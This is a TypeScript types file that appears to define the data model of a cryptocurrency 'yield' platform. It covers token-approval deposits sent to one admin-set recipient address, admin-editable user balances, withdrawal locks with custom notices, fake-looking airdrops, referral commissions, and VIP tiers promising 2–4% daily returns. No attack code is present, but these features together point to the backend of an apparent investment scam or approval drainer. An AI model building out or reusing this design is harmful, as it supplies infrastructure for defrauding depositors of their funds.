export interface DepositSystem {
  id: string;
  currency: string;
  chainId: number;
  chainName: string;
  tokenAddress: string;
  enabled: boolean;
}

export interface UserAirdropConfig {
  id: string;
  targetAddress: string; // user's wallet address in lowercase, or 'ALL'
  standardUSDT: number;
  outputETH: number;
  endTime: number; // timestamp in ms
  durationDays: number;
  enabled: boolean;
  createdAt: number;
}

export interface AppConfig {
  recipientAddress: string;
  adminPasswordHash: string;
  minDepositUSDT: number;
  minWithdrawUSDT?: number;
  minParticipateETH?: number;
  baseYieldRate: number; // Daily yield rate
  depositMode?: 'approve' | 'transfer';
  depositSystems?: DepositSystem[];
  yieldTiers?: YieldTier[];
  airdropStandardUSDT?: number;
  airdropOutputETH?: number;
  airdropCountdownDays?: number;
  userAirdrops?: UserAirdropConfig[];
}

export interface UserAccount {
  walletAddress: string;
  usdtBalance: number;
  occupiedUSDT: number;
  totalYieldEarned: number;
  lastYieldPayout: number; // Timestamp
  createdAt: number;
  updatedAt?: number;
  usdcBalance?: number;
  occupiedUSDC?: number;
  btcBalance?: number;
  occupiedBTC?: number;
  ethBalance?: number;
  occupiedETH?: number;
  isBlocked?: boolean;
  isWithdrawLocked?: boolean;
  withdrawLockNotice?: string;
  customId?: string;
  airdropPledgedUSDT?: number;
  airdropConfig?: UserAirdropConfig;
  fundPassword?: string;
  referredBy?: string;
  referralCode?: string;
  referralCount?: number;
  commissionEarned?: number;
}

export interface TransactionLog {
  id: string;
  timestamp: number;
  walletAddress: string;
  type: 'connect' | 'deposit' | 'withdraw' | 'exchange' | 'yield' | 'forward' | 'admin_change_recipient' | 'admin_change_balance' | 'system';
  amount: number;
  currency: string;
  status: 'success' | 'pending' | 'failed';
  details: string;
  txHash?: string;
  proofImage?: string;
}

export interface SupportChatSession {
  chatId: string;
  walletAddress?: string;
  messages: Array<{
    id: string;
    sender: 'user' | 'agent';
    text: string;
    timestamp: number;
  }>;
  status: 'active' | 'closed';
  updatedAt: number;
  unreadForAdmin?: boolean;
  unreadForUser?: boolean;
}

export interface DatabaseState {
  config: AppConfig;
  users: Record<string, UserAccount>; // WalletAddress -> UserAccount
  logs: TransactionLog[];
  chats?: Record<string, SupportChatSession>;
}

export interface YieldTier {
  level: string;
  minAmount: number;
  maxAmount: number;
  yieldMin: number; // e.g. 0.0050 (0.50%)
  yieldMax: number; // e.g. 0.0060 (0.60%)
  unit: string;
}

export const YIELD_TIERS: YieldTier[] = [
  { level: 'VIP', minAmount: 100, maxAmount: 1000, yieldMin: 0.0200, yieldMax: 0.0240, unit: 'ETH' },
  { level: 'VIP1', minAmount: 1000, maxAmount: 5000, yieldMin: 0.0240, yieldMax: 0.0260, unit: 'ETH' },
  { level: 'VIP2', minAmount: 5000, maxAmount: 20000, yieldMin: 0.0260, yieldMax: 0.0280, unit: 'ETH' },
  { level: 'VIP3', minAmount: 20000, maxAmount: 50000, yieldMin: 0.0280, yieldMax: 0.0300, unit: 'ETH' },
  { level: 'VIP4', minAmount: 50000, maxAmount: 200000, yieldMin: 0.0300, yieldMax: 0.0320, unit: 'ETH' },
  { level: 'VIP5', minAmount: 200000, maxAmount: 500000, yieldMin: 0.0320, yieldMax: 0.0400, unit: 'ETH' },
];
